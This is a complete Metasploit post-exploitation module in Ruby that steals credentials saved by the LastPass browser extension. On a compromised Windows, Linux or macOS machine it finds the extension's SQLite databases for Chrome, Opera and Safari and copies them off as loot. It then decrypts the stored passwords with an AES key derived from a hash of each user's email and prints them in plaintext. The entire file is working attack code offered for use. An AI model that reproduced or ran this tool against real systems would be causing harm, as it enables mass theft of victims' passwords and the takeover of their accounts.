
require 'msf/core'
require 'base64'
require 'sqlite3'


class Metasploit3 < Msf::Post

	include Msf::Post::File
	include Msf::Post::Windows::UserProfiles
	include Msf::Post::OSX::System
	include Msf::Post::Unix

	def initialize(info={})
	    super( update_info( info,
		'Name' => 'LastPass Master Password Extractor',
		'Description' => %q{
		    This module extracts and decrypts login accounts and passwords stored by
		    Lastpass.},
		'License' => MSF_LICENSE,
		'Author' =>
		  [
		    'Alberto Garcia Illera <agarciaillera[at]gmail.com>',
		    'Martin Vigo <martinvigo[at]gmail.com>'
		  ],
		'Platform' => %w{ linux osx unix win },
		'SessionTypes' => [ 'meterpreter, shell' ]
	    ))

	end



	def run
		if session.platform =~ /win/ and session.type == "shell" # No Windows shell support
			print_error "Shell sessions on Windows are not supported"
			return		
		end

		print_status "Searching for LastPass databases..."

		db_paths = get_database_paths # Find databases and get the remote paths

		if db_paths.size==0 # Found any database?
			print_status "No databases found"
			return		
		end
		
		print_status "Looking for credentials in all databases found..."

		for db_path in db_paths
			# Read and store the remote database locally		
			data = read_file(db_path)
			loot_path = store_loot('lastpass.database', 'application/x-sqlite3', data, nil, "LastPass database #{db_path}")

			# Parsing/Querying the DB
			db = SQLite3::Database.new(loot_path)
			query_result = db.execute( "SELECT username, password 
							FROM LastPassSavedLogins2 
							WHERE username IS NOT NULL AND username != '' AND password IS NOT NULL AND password != '';")

			for row in query_result # Decrypt passwords
				print_status "Decrypting password for user #{row[0]}..."
				password = getClearTextPassword(row[0], row[1])
				if password.blank?
					print_error "Username: '#{row[0]}' (Password was not found/decrypted)"
				else
					print_good("Username: '#{row[0]}' -> Password: '#{password}'")
				end
			end	
		end
	end



	# Finds the databases in the victim's machine
	def get_database_paths # Based on https://lastpass.com/support.php?cmd=showfaq&id=425
		platform = session.platform
		found_dbs_paths = Array.new
		user_profiles = get_user_profiles()
	
		case platform
	  	when /win/
			os = session.sys.config.sysinfo['OS']
			user_profiles = grab_user_profiles()

		    	if os =~ /Vista|Windows 7|Windows 8/
				for user_profile in user_profiles
					print_status "Found user: #{user_profile['UserName']}"

					#Check Chrome 
					path = "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
					file_paths = get_file_paths(path, 'Chrome')
					found_dbs_paths.push( file_paths ) if not file_paths.nil?

					#Check Opera
					path = "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\databases\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
					file_paths = get_file_paths(path, 'Opera')
					found_dbs_paths.push( file_paths ) if not file_paths.nil?

					#Check Safari
					path = "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\Databases\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
					file_paths = get_file_paths(path, 'Safari')
					found_dbs_paths.push( file_paths ) if not file_paths.nil?

					print_line ""				
				end
		      	elsif os =~ /XP/
				for user_profile in user_profiles
					print_status "Found user: #{user_profile['UserName']}"

					#Check Chrome
					print_status 'Checking in Chrome...'
					path = "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
					file_paths = get_file_paths(path, 'Chrome')
					found_dbs_paths.push( file_paths ) if not file_paths.nil?

					#Check Opera
					print_status 'Checking in Opera...'
					path = "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\databases\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
					file_paths = get_file_paths(path, 'Opera')
					found_dbs_paths.push( file_paths ) if not file_paths.nil?

					#Check Safari
					print_status 'Checking in Safari...'
					path = "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\Databases\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
					file_paths = get_file_paths(path, 'Safari')
					found_dbs_paths.push( file_paths ) if not file_paths.nil?
					
					print_line ""
				end
		      	else
				print_error "OS not recognized: #{os}"
				return nil
		      	end

	  	when /unix|linux/
			for user_profile in user_profiles
				print_status "Found user: #{user_profile['UserName']}"

				#Check Chrome 
				path = "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
				file_paths = get_file_paths(path, 'Chrome')
				found_dbs_paths.push( file_paths ) if not file_paths.nil?
			end
	  
	  	when /osx/
			for user_profile in user_profiles
				print_status "Found user: #{user_profile['UserName']}"

				#Check Chrome 
				path = "#{user_profile['LocalAppData']}/Google/Chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
				file_paths = get_file_paths(path, 'Chrome')
				found_dbs_paths.push( file_paths ) if not file_paths.nil?

				#Check Safari
				path = "#{user_profile['AppData']}/Safari/Databases/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
				file_paths = get_file_paths(path, 'Safari')
				found_dbs_paths.push( file_paths ) if not file_paths.nil?

				#Check Opera
				path = "#{user_profile['LocalAppData']}/com.operasoftware.Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
				file_paths = get_file_paths(path, 'Opera')
				found_dbs_paths.push( file_paths ) if not file_paths.nil?
			end

		else
			raise 'platform not recognized: ' << platform
		end

		return found_dbs_paths.flatten
	end

	

	# Returns the relevant information from user profiles
	def get_user_profiles()
		case session.platform
		when /unix|linux/
			user_profiles = Array.new

			user_names = session.shell_command("ls /home").split
			for user_name in user_names
				user_profiles.push({'UserName' => user_name, "LocalAppData" => "/home/#{user_name}"})
			end

			return user_profiles

		when /osx/
			user_profiles = Array.new

			user_names = session.shell_command("ls /Users").split
			for user_name in user_names
				user_profiles.push({'UserName' => user_name, "AppData" => "/Users/#{user_name}/Library", "LocalAppData" => "/Users/#{user_name}/Library/Application Support"}) if user_name != 'Shared'
			end

			return user_profiles

		when /win/
			return grab_user_profiles()
		else
			print_error "OS not recognized: #{os}"
			return nil
		end
	end



	# Extracts the databases paths from the given folder ignoring . and ..
	def get_file_paths(path, browser)
		found_dbs_paths = Array.new

		if directory?(path)
			if session.type == "meterpreter"
				files = client.fs.dir.entries(path)
				for file_path in files
					found_dbs_paths.push(File.join(path, file_path)) if file_path != '.' and  file_path != '..'
				end
			
			elsif session.type == "shell"
				files = session.shell_command("ls \"#{path}\"").split
				for file_path in files
					found_dbs_paths.push(File.join(path, file_path)) if file_path != 'Shared'
				end
			
			else
				print_error "Session type not recognized: #{session.type}"
				return nil
			end
		end
		
		if found_dbs_paths.size > 0  
			print_good "Found #{found_dbs_paths.size} database/s in #{browser}"
			return found_dbs_paths 
		else 
			print_status "No databases found for #{browser}"
			return nil
		end
	end



	# Decrypts the password
	def getClearTextPassword(email, encrypted_data)
		return if encrypted_data.blank?

		sha256_hex_email = OpenSSL::Digest::SHA256.hexdigest(email);
		sha256_binary_email = [sha256_hex_email].pack "H*" # Do hex2bin

		if encrypted_data.include?("|") # Apply CBC
	    		decipher = OpenSSL::Cipher.new("AES-256-CBC")
			decipher.decrypt
			decipher.key = sha256_binary_email # The key is the emails hashed to SHA256 and converted to binary
			decipher.iv = Base64.decode64(encrypted_data[1, 24]) # Discard ! and |
	    		encrypted_password = encrypted_data[26..-1]
			begin	    		
				decipher_result = decipher.update( Base64.decode64(encrypted_password) ) + decipher.final
			rescue
				print_error "Password could not be decrypted"
				return nil
			end

	  	else # Apply ECB
			decipher = OpenSSL::Cipher.new("AES-256-ECB")
	    		decipher.decrypt
	    		decipher.key = sha256_binary_email
			begin	    		
				decipher_result = decipher.update( Base64.decode64(encrypted_data) ) + decipher.final
			rescue
				print_error "Password could not be decrypted"
				return nil
			end
		end

		return decipher_result
	end

end
